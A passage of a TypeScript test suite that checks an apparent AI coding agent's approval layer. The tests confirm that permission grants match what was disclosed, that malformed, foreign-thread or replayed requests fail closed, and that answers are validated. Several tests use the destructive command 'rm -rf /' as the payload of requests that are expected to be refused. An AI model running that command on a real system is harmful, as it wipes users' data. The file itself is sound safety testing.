    transport.serverRequest(89, 'item/permissions/requestApproval', {
      ...permParams,
      itemId: 'it_3',
      reason: 'x'.repeat(MAX_PERMISSION_DETAIL_CHARS + 1),
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(2),
    )
    const [cleaned, tooLong] = events.filter(
      (e): e is Extract<RuntimeEvent, { type: 'user_input_request' }> =>
        e.type === 'user_input_request',
    )
    expect(cleaned?.permission?.agentReason).toBe('needs write access')
    expect(tooLong?.permission !== undefined && 'agentReason' in tooLong.permission).toBe(false)
    await handle.close()
    await consumer
  })

  it('a permissions request with fileSystem ENTRIES discloses them access-labelled, then grants exactly what was shown (036 P1-F #5)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const entryParams = {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_9',
      environmentId: null,
      startedAtMs: 0,
      cwd: '/tmp/x',
      reason: 'needs /etc',
      permissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: null,
          entries: [
            { path: { type: 'path', path: '/etc' }, access: 'write' },
            {
              path: { type: 'special', value: { kind: 'project_roots', subpath: 'src' } },
              access: 'read',
            },
          ],
        },
      },
    }
    transport.serverRequest(87, 'item/permissions/requestApproval', entryParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const req = firstOfType(events, 'user_input_request')
    expect(req.permission).toEqual({
      cwd: '/tmp/x',
      agentReason: 'needs /etc',
      paths: ['write /etc', 'read special:project_roots/src'],
      network: false,
    })
    await handle.respondUserInput('number:87', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 87)).toBe(true))
    expect(resultFor(transport, 87)).toEqual({
      permissions: entryParams.permissions,
      scope: 'turn',
    })
    await handle.close()
    await consumer
  })

  const assertConformantGrant = (result: unknown): Record<string, unknown> => {
    const grant = result as { permissions: Record<string, unknown>; scope: string }
    expect(grant.scope).toBe('turn')
    expect(typeof grant.permissions).toBe('object')
    for (const section of ['network', 'fileSystem'] as const) {
      if (section in grant.permissions) {
        expect(grant.permissions[section]).not.toBeNull()
        expect(typeof grant.permissions[section]).toBe('object')
      }
    }
    return grant.permissions
  }

  it('a NULLABLE permissions request yields a conformant grant — null sections omitted, never echoed raw (044 P1-F)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(94, 'item/permissions/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_n',
      environmentId: null,
      startedAtMs: 0,
      cwd: '/tmp/x',
      reason: 'needs write',
      permissions: { network: null, fileSystem: { read: null, write: ['/tmp/out'] } },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').permission).toMatchObject({
      paths: ['write /tmp/out'],
      network: false,
    })

    await handle.respondUserInput('number:94', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 94)).toBe(true))
    const granted = assertConformantGrant(resultFor(transport, 94))
    expect('network' in granted).toBe(false)
    expect(granted['fileSystem']).toEqual({ read: null, write: ['/tmp/out'] })

    await handle.close()
    await consumer
  })

  it('a FULLY-NULL permissions request yields a conformant grant-nothing (044 P1-F)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(95, 'item/permissions/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_nn',
      environmentId: null,
      startedAtMs: 0,
      cwd: '/tmp/x',
      reason: 'asks for nothing',
      permissions: { network: null, fileSystem: null },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:95', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 95)).toBe(true))
    expect(resultFor(transport, 95)).toEqual({ permissions: {}, scope: 'turn' })
    assertConformantGrant(resultFor(transport, 95))

    await handle.close()
    await consumer
  })

  it('an out-of-spec network `enabled` is granted exactly as it was DISCLOSED (shown == granted)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(96, 'item/permissions/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_bad',
      environmentId: null,
      startedAtMs: 0,
      cwd: '/tmp/x',
      reason: 'malformed network ask',
      permissions: { network: { enabled: 'yes' }, fileSystem: null },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').permission?.network).toBe(false)
    await handle.respondUserInput('number:96', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 96)).toBe(true))
    const granted = assertConformantGrant(resultFor(transport, 96))
    expect(granted['network']).toEqual({ enabled: false })

    await handle.close()
    await consumer
  })

  it('a permissions request the neutral scope cannot display FAILS CLOSED — no raw grant is echoed unseen (036 P1-F #5)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(88, 'item/permissions/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'it_10',
      environmentId: null,
      startedAtMs: 0,
      cwd: '/tmp/x',
      reason: 'needs something we cannot render',
      permissions: {
        network: { enabled: false },
        fileSystem: {
          read: null,
          write: null,
          entries: [
            {
              path: { type: 'special', value: { kind: 'unknown', path: '/???', subpath: null } },
              access: 'write',
            },
          ],
        },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:88', { kind: 'answer', answers: {} })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 88)).toBe(true))
    expect(resultFor(transport, 88)).toEqual({ permissions: {}, scope: 'turn' })
    expect(JSON.stringify(resultFor(transport, 88))).not.toContain('unknown')
    await handle.close()
    await consumer
  })

  it('permissions decline → documented {permissions:{},scope:"turn"}, never a JSON-RPC error', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(83, 'item/permissions/requestApproval', permParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:83', { kind: 'reject' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 83)).toBe(true))
    expect(resultFor(transport, 83)).toEqual({ permissions: {}, scope: 'turn' })
    expect(transport.errors.some((e) => e.id === 83)).toBe(false)
    await handle.close()
    await consumer
  })

  const multiQuestionParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_1',
    questions: [
      {
        id: 'q_a',
        header: 'A',
        question: 'first?',
        isOther: false,
        isSecret: false,
        options: [{ label: 'x', description: '' }],
      },
      {
        id: 'q_b',
        header: 'B',
        question: 'second?',
        isOther: false,
        isSecret: false,
        options: [{ label: 'y', description: '' }],
      },
    ],
    autoResolutionMs: null,
  }

  it('requestUserInput with MULTIPLE questions answers EVERY questionId (033, fixing 023 P2 #1)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(85, 'item/tool/requestUserInput', multiQuestionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:85', {
      kind: 'answer',
      answers: { q_a: 'x', q_b: ['y'] },
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 85)).toBe(true))
    expect(resultFor(transport, 85)).toEqual({
      answers: { q_a: { answers: ['x'] }, q_b: { answers: ['y'] } },
    })
    await handle.close()
    await consumer
  })

  const CODEX_UNFORWARDABLE: readonly {
    what: string
    answers: Record<string, string | string[]>
  }[] = [
    { what: 'an empty array', answers: { q_a: [], q_b: 'y' } },
    { what: 'a blank string', answers: { q_a: '   ', q_b: 'y' } },
    { what: 'an array of blanks', answers: { q_a: ['', ' '], q_b: 'y' } },
    {
      what: 'several for a question Codex publishes as single-select',
      answers: { q_a: ['x', 'w'], q_b: 'y' },
    },
    { what: 'a substantively partial answer — present, but empty', answers: { q_a: 'x', q_b: [] } },
    {
      what: 'a value that is not on the list, for a question that takes no other',
      answers: { q_a: 'something I typed', q_b: 'y' },
    },
  ]

  for (const [i, { what, answers }] of CODEX_UNFORWARDABLE.entries()) {
    it(`requestUserInput fails closed on ${what}, and never writes it to the wire`, async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      const id = 90 + i
      transport.serverRequest(id, 'item/tool/requestUserInput', multiQuestionParams)
      await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

      await expect(
        handle.respondUserInput(`number:${id}`, { kind: 'answer', answers }),
      ).rejects.toThrow(/cannot be forwarded/)
      expect(transport.responses.some((r) => r.id === id)).toBe(false)
      expect(transport.errors.some((e) => e.id === id)).toBe(false)

      await handle.respondUserInput(`number:${id}`, {
        kind: 'answer',
        answers: { q_a: 'x', q_b: 'y' },
      })
      await vi.waitFor(() => expect(transport.responses.some((r) => r.id === id)).toBe(true))
      expect(resultFor(transport, id)).toEqual({
        answers: { q_a: { answers: ['x'] }, q_b: { answers: ['y'] } },
      })
      await handle.close()
      await consumer
    })
  }

  it('an `isOther` question takes the answer that is not on the list, in the provider’s own slot (143)', async () => {
    const otherParams = {
      ...multiQuestionParams,
      questions: multiQuestionParams.questions.map((q) => ({ ...q, isOther: true })),
    }
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(96, 'item/tool/requestUserInput', otherParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').questions[0]!.allowOther).toBe(true)

    await handle.respondUserInput('number:96', {
      kind: 'answer',
      answers: { q_a: 'neither — the third thing', q_b: 'y' },
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 96)).toBe(true))
    expect(resultFor(transport, 96)).toEqual({
      answers: { q_a: { answers: ['neither — the third thing'] }, q_b: { answers: ['y'] } },
    })
    await handle.close()
    await consumer
  })

  it('carries `isSecret` rather than dropping it a second time (143, from 141 §3.1)', async () => {
    const secretParams = {
      ...multiQuestionParams,
      questions: [{ ...multiQuestionParams.questions[0]!, isSecret: true, isOther: true }],
    }
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(97, 'item/tool/requestUserInput', secretParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    const question = firstOfType(events, 'user_input_request').questions[0]!
    expect(question.secret).toBe(true)
    expect(multiQuestionParams.questions[0]!.isSecret).toBe(false)
    await handle.respondUserInput('number:97', { kind: 'answer', answers: { q_a: 'hunter2' } })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 97)).toBe(true))
    await handle.close()
    await consumer
  })

  it('requestUserInput with an INCOMPLETE answer is refused, and the card stays live (033, 142)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(86, 'item/tool/requestUserInput', multiQuestionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await expect(
      handle.respondUserInput('number:86', { kind: 'answer', answers: { q_a: 'x' } }),
    ).rejects.toThrow(/cannot be forwarded/)
    expect(transport.responses.some((r) => r.id === 86)).toBe(false)
    expect(transport.errors.some((e) => e.id === 86)).toBe(false)
    await handle.close()
    await consumer
  })

  it('a REJECT is still the documented empty payload, and still ends the request (033)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(87, 'item/tool/requestUserInput', multiQuestionParams)
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    await handle.respondUserInput('number:87', { kind: 'reject' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 87)).toBe(true))
    expect(resultFor(transport, 87)).toEqual({ answers: {} })
    await handle.close()
    await consumer
  })

  it('a question id of `__proto__` or `constructor` reaches the provider (146 §2)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(140, 'item/tool/requestUserInput', {
      ...questionParams,
      questions: [
        { ...questionParams.questions[0]!, id: '__proto__' },
        { ...questionParams.questions[0]!, id: 'constructor', question: 'and again' },
      ],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').questions.map((q) => q.id)).toEqual([
      '__proto__',
      'constructor',
    ])

    await handle.respondUserInput('number:140', {
      kind: 'answer',
      answers: JSON.parse('{"__proto__":"blue","constructor":"blue"}') as Record<string, string>,
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 140)).toBe(true))

    const payload = resultFor(transport, 140) as { answers: Record<string, unknown> }
    expect(Object.getOwnPropertyNames(payload.answers).sort()).toEqual(['__proto__', 'constructor'])
    expect(JSON.stringify(payload)).toBe(
      '{"answers":{"__proto__":{"answers":["blue"]},"constructor":{"answers":["blue"]}}}',
    )
    await handle.close()
    await consumer
  })

  it('two questions with the SAME ID are declined, and never become a card (146 §2)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(141, 'item/tool/requestUserInput', {
      ...questionParams,
      questions: [
        { ...questionParams.questions[0]!, id: 'q1' },
        { ...questionParams.questions[0]!, id: undefined, question: 'the second' },
      ],
    })

    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 141)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 141)).toEqual({ answers: {} })
    expect(transport.errors.some((e) => e.id === 141)).toBe(false)

    transport.serverRequest(142, 'item/tool/requestUserInput', {
      ...questionParams,
      questions: [
        { ...questionParams.questions[0]!, id: 'q1' },
        { ...questionParams.questions[0]!, id: 'q2', question: 'the second' },
      ],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    expect(firstOfType(events, 'user_input_request').questions.map((q) => q.id)).toEqual([
      'q1',
      'q2',
    ])
    await handle.close()
    await consumer
  })

  it('carries a NON-EMPTY option description across this adapter (146 §4.3)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(143, 'item/tool/requestUserInput', {
      ...questionParams,
      questions: [
        {
          id: 'q_env',
          header: 'Env',
          question: 'where should this run?',
          isOther: false,
          isSecret: false,
          options: [
            { label: 'staging', description: 'the shared box, safe to break, rebuilt nightly' },
            { label: 'production', description: '' },
          ],
        },
      ],
    })
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

    expect(firstOfType(events, 'user_input_request').questions[0]!.options).toEqual([
      { label: 'staging', description: 'the shared box, safe to break, rebuilt nightly' },
      { label: 'production' },
    ])
    await handle.close()
    await consumer
  })

  it('a requestUserInput with NO questions is declined, and never becomes a live Approve (064, 142)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(88, 'item/tool/requestUserInput', { questions: [] })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 88)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 88)).toEqual({ answers: {} })
    expect(transport.errors.some((e) => e.id === 88)).toBe(false)

    transport.serverRequest(89, 'item/permissions/requestApproval', {
      cwd: '/tmp/x',
      reason: 'needs write',
      permissions: { write: ['/tmp/x'] },
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1),
    )
    await handle.close()
    await consumer
  })

  it('two EXPLICIT duplicate ids are declined by the duplicate check alone (150)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(95, 'item/tool/requestUserInput', {
      questions: [
        { id: 'same', question: 'first?', options: [{ label: 'a' }] },
        { id: 'same', question: 'second?', options: [{ label: 'b' }] },
      ],
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 95)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 95)).toEqual({ answers: {} })
    expect(transport.errors.some((e) => e.id === 95)).toBe(false)
    await handle.close()
    await consumer
  })

  it('a question with a MISSING id is declined before publication (150, 148 M5)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(90, 'item/tool/requestUserInput', {
      questions: [{ question: 'Which one?', options: [{ label: 'a' }, { label: 'b' }] }],
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 90)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 90)).toEqual({ answers: {} })
    expect(transport.errors.some((e) => e.id === 90)).toBe(false)

    transport.serverRequest(91, 'item/tool/requestUserInput', {
      questions: [{ id: 'q_real', question: 'Which one?', options: [{ label: 'a' }] }],
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1),
    )
    await handle.close()
    await consumer
  })

  it('…and an EMPTY-STRING id is the same defect, declined the same way (150)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(92, 'item/tool/requestUserInput', {
      questions: [{ id: '', question: 'Which one?', options: [{ label: 'a' }] }],
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 92)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 92)).toEqual({ answers: {} })
    await handle.close()
    await consumer
  })

  it('a blank option label NEVER becomes a card on Codex either (150, 148 M6)', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(93, 'item/tool/requestUserInput', {
      questions: [
        { id: 'q1', question: 'Which one?', options: [{ label: '   ' }, { label: 'real' }] },
      ],
    })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 93)).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(resultFor(transport, 93)).toEqual({ answers: {} })

    transport.serverRequest(94, 'item/tool/requestUserInput', {
      questions: [
        { id: 'q2', question: 'Which one?', options: [{ label: ' spaced ' }, { label: 'real' }] },
      ],
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(1),
    )
    const published = events.filter((e) => e.type === 'user_input_request')[0]!
    expect(published.questions[0]!.options).toEqual([{ label: ' spaced ' }, { label: 'real' }])
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — lifecycle-bounded request-id tombstones (044 P2 #7)', () => {
  const tombstones = (handle: SessionHandle): number => {
    const count = (handle as CodexSessionHandle).tombstoneCount
    if (typeof count !== 'number') {
      throw new Error(
        'no tombstone accounting exists: request-id tombstones are retained for the life of the ' +
          'session, unbounded in the number of requests (044 P2 #7)',
      )
    }
    return count
  }

  async function turnWithApproval(
    transport: FakeTransport,
    handle: Awaited<ReturnType<CodexRuntime['start']>>,
    events: RuntimeEvent[],
    id: number | string,
    turnId: string,
  ): Promise<void> {
    const responsesBefore = transport.responses.length
    const cardsBefore = events.filter((e) => e.type === 'permission_request').length
    await handle.send('go')
    transport.serverRequest(id, 'item/commandExecution/requestApproval', {
      command: 'echo hi',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request').length).toBe(cardsBefore + 1),
    )
    await handle.respondPermission(`${typeof id}:${id}`, { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(responsesBefore + 1))
    const turnsBefore = events.filter((e) => e.type === 'turn').length
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(turnId)),
    )
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'turn').length).toBe(turnsBefore + 1),
    )
  }

  it('BOUNDED MEMORY: the 10,000-request probe settles to a bounded residual, not 10,000', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    for (let id = 0; id < 10_000; id++) {
      transport.serverRequest(id, 'item/commandExecution/requestApproval', {
        command: `echo ${id}`,
        cwd: '/tmp/x',
      })
    }
    await vi.waitFor(
      () => expect(events.filter((e) => e.type === 'permission_request').length).toBe(10_000),
      { timeout: 20_000 },
    )
    for (let id = 0; id < 10_000; id++) {
      await handle.respondPermission(`number:${id}`, { outcome: 'deny' })
    }
    await vi.waitFor(() => expect(transport.responses.length).toBe(10_000), { timeout: 20_000 })
    expect(tombstones(handle)).toBeGreaterThanOrEqual(10_000)

    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn'))

    expect(tombstones(handle)).toBe(0)

    await handle.close()
    await consumer
  }, 60_000)

  it('SAFETY: a late answer for a RETIRED id is still a refusal — no second response, no authorization', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await turnWithApproval(transport, handle, events, 7, 'tn_1')
    expect(transport.responses).toEqual([{ id: 7, result: { decision: 'accept' } }])
    expect(tombstones(handle)).toBe(0)

    await expect(handle.respondPermission('number:7', { outcome: 'allow' })).rejects.toThrow()
    await new Promise((r) => setTimeout(r, 10))
    expect(transport.responses.filter((r) => r.id === 7)).toHaveLength(1)

    await handle.close()
    await consumer
  })

  it('SAFETY: a REPLAYED provider request for a retired id publishes NO card and no second response', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await turnWithApproval(transport, handle, events, 7, 'tn_1')
    const cardsAfterTurn1 = events.filter((e) => e.type === 'permission_request').length

    await handle.send('again')
    transport.serverRequest(7, 'item/commandExecution/requestApproval', {
      command: 'echo REPLAY',
      cwd: '/tmp/x',
    })
    await new Promise((r) => setTimeout(r, 20))

    expect(events.filter((e) => e.type === 'permission_request').length).toBe(cardsAfterTurn1)
    expect(transport.responses.filter((r) => r.id === 7)).toHaveLength(1)

    await handle.close()
    await consumer
  })

  it('SAFETY: retirement happens at the TURN terminal, never mid-turn — a same-turn duplicate is still refused', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    transport.serverRequest(5, 'item/commandExecution/requestApproval', {
      command: 'echo FIRST',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    await handle.respondPermission('number:5', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(tombstones(handle)).toBeGreaterThan(0)

    transport.serverRequest(5, 'item/commandExecution/requestApproval', {
      command: 'echo SECOND',
      cwd: '/tmp/x',
    })
    await new Promise((r) => setTimeout(r, 20))
    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(1)
    expect(transport.responses.filter((r) => r.id === 5)).toHaveLength(1)

    await handle.close()
    await consumer
  })

  it('TYPE-PRESERVING across retirement: numeric 1 retired does not retire string "1" (045)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await turnWithApproval(transport, handle, events, 1, 'tn_1')

    await handle.send('next')
    transport.serverRequest('1', 'item/commandExecution/requestApproval', {
      command: 'echo STRING ONE',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'permission_request').length).toBe(2),
    )
    const card = events.filter((e) => e.type === 'permission_request')[1]
    expect(card).toMatchObject({ id: 'string:1', detail: 'echo STRING ONE' })

    transport.serverRequest(1, 'item/commandExecution/requestApproval', {
      command: 'echo NUMERIC REPLAY',
      cwd: '/tmp/x',
    })
    await new Promise((r) => setTimeout(r, 20))
    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(2)

    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — server requests are scoped to the active thread+turn (060 P1)', () => {
  const METHODS = [
    { method: 'item/commandExecution/requestApproval', refusal: { decision: 'decline' } },
    { method: 'item/fileChange/requestApproval', refusal: { decision: 'decline' } },
    { method: 'item/tool/requestUserInput', refusal: { answers: {} } },
    { method: 'item/permissions/requestApproval', refusal: { permissions: {}, scope: 'turn' } },
  ] as const

  const cards = (events: RuntimeEvent[]): RuntimeEvent[] =>
    events.filter((e) => e.type === 'permission_request' || e.type === 'user_input_request')

  it("REVIEWER'S PROBE: a FOREIGN-THREAD approval is never actionable and is never accepted", async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(71, 'item/commandExecution/requestApproval', {
      threadId: 'th_OTHER',
      command: 'rm -rf /',
      cwd: '/tmp/x',
    })
    await new Promise((r) => setTimeout(r, 30))
    expect(
      cards(events),
      'a foreign-thread request must never become an actionable card',
    ).toHaveLength(0)
    expect(transport.responses).toEqual([{ id: 71, result: { decision: 'decline' } }])
    await expect(handle.respondPermission('number:71', { outcome: 'allow' })).rejects.toThrow()
    expect(
      transport.responses.some((r) => (r.result as { decision?: string }).decision === 'accept'),
    ).toBe(false)

    await handle.close()
    await consumer
  })

  it("REVIEWER'S PROBE: a STALE-TURN approval (right thread, old turn) is never actionable", async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(72, 'item/commandExecution/requestApproval', {
      turnId: 'tn_STALE',
      command: 'rm -rf /',
      cwd: '/tmp/x',
    })
    await new Promise((r) => setTimeout(r, 30))
    expect(cards(events), 'a stale-turn request must never become actionable').toHaveLength(0)
    expect(transport.responses).toEqual([{ id: 72, result: { decision: 'decline' } }])

    await handle.close()
    await consumer
  })

  it('an approval raised while IDLE (no live turn) is refused — nothing can be authorized out of turn', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.serverRequest(73, 'item/commandExecution/requestApproval', {
      threadId: 'th_1',
      turnId: 'tn_1',
      command: 'rm -rf /',
    })
    await new Promise((r) => setTimeout(r, 30))
    expect(cards(events), 'an out-of-turn request must never become actionable').toHaveLength(0)
    expect(transport.responses).toEqual([{ id: 73, result: { decision: 'decline' } }])

    await handle.close()
    await consumer
  })

  it('MISSING or MALFORMED scope fails closed for every supported method, with that method’s safe refusal', async () => {
    const unscoped: unknown[] = [
      { command: 'x' },
      { threadId: 'th_1', command: 'x' },
      { turnId: 'tn_1', command: 'x' },
      { threadId: 42, turnId: 'tn_1', command: 'x' },
      { threadId: 'th_1', turnId: 42, command: 'x' },
      'not a record',
      null,
    ]
    for (const { method, refusal } of METHODS) {
      for (const [i, params] of unscoped.entries()) {
        const { transport, handle, events, consumer } = await startCodexInTurn()
        transport.serverRequestRaw(500 + i, method, params)
        await new Promise((r) => setTimeout(r, 20))
        expect(cards(events), `${method} ${JSON.stringify(params)}`).toHaveLength(0)
        expect(transport.responses[0], `${method} ${JSON.stringify(params)}`).toEqual({
          id: 500 + i,
          result: refusal,
        })
        await handle.close()
        await consumer
      }
    }
  })

  it('an IN-SCOPE request of every supported method still publishes a card and resolves normally', async () => {
    for (const { method } of METHODS) {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(80, method, {
        command: 'ls',
        cwd: '/tmp/x',
        reason: 'why',
        questions: [
          {
            id: 'q_a',
            header: 'A',
            question: 'first?',
            isOther: false,
            isSecret: false,
            options: [{ label: 'x', description: '' }],
          },
        ],
      })
      await vi.waitFor(() => expect(cards(events).length).toBe(1))
      expect(cards(events)[0]).toMatchObject({ id: 'number:80' })
      await handle.close()
      await consumer
    }
  })

  it('a scope-rejected request does NOT burn a legitimate id: the SAME id still works in scope', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(90, 'item/commandExecution/requestApproval', { command: 'legit' })
    await vi.waitFor(() => expect(cards(events).length).toBe(1))

    transport.serverRequest(90, 'item/commandExecution/requestApproval', {
      threadId: 'th_OTHER',
      command: 'evil',
    })
    await new Promise((r) => setTimeout(r, 20))
    expect(cards(events)).toHaveLength(1)
    expect(transport.responses).toHaveLength(0)

    await handle.respondPermission('number:90', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.length).toBe(1))
    expect(transport.responses[0]).toEqual({ id: 90, result: { decision: 'accept' } })

    await handle.close()
    await consumer
  })

  it('an UNSUPPORTED method is still a JSON-RPC error, and is refused before any scope logic', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    transport.serverRequestRaw(99, 'item/future/requestSomething', { threadId: 'th_OTHER' })
    await vi.waitFor(() => expect(transport.errors.length).toBe(1))
    expect(transport.errors[0]).toMatchObject({ id: 99, code: -32601 })
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — the server-request id lifecycle is one state machine (066 F1+F2)', () => {
  const cards = (events: RuntimeEvent[]): RuntimeEvent[] =>
    events.filter((e) => e.type === 'permission_request' || e.type === 'user_input_request')
  const acceptsFor = (transport: FakeTransport, id: number) =>
    transport.responses.filter(
      (r) => r.id === id && (r.result as { decision?: string }).decision === 'accept',
    )

  it('F1: a same-kind duplicate arriving BEFORE the answer is processed → decline, never accept', () =>
    (async () => {
      const { transport, handle, events, consumer } = await startCodexInTurn()
      transport.serverRequest(42, 'item/commandExecution/requestApproval', { command: 'legit' })
      await vi.waitFor(() => expect(cards(events).length).toBe(1))

      transport.serverRequest(42, 'item/commandExecution/requestApproval', { command: 'evil' })
      await vi.waitFor(() => expect(transport.responses.length).toBe(1))

      expect(cards(events)).toHaveLength(1)
      expect(transport.responses).toEqual([{ id: 42, result: { decision: 'decline' } }])
      expect(events.filter((e) => e.type === 'request_resolved')).toEqual([
        { type: 'request_resolved', id: 'number:42' },
      ])
      await expect(handle.respondPermission('number:42', { outcome: 'allow' })).rejects.toThrow()
      await new Promise((r) => setTimeout(r, 20))
      expect(acceptsFor(transport, 42)).toHaveLength(0)

      await handle.close()
      await consumer
    })())

  it('F1: the duplicate enqueued in the SAME TICK as the answer still yields exactly one response', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(42, 'item/commandExecution/requestApproval', { command: 'legit' })
    await vi.waitFor(() => expect(cards(events).length).toBe(1))

    transport.serverRequest(42, 'item/commandExecution/requestApproval', { command: 'evil' })
    await handle.respondPermission('number:42', { outcome: 'allow' }).catch(() => undefined)
    await new Promise((r) => setTimeout(r, 30))

    expect(transport.responses.filter((r) => r.id === 42)).toHaveLength(1)
    expect(cards(events)).toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('F2: an id SPENT by an out-of-scope refusal serves NO second request (no dead card)', async () => {
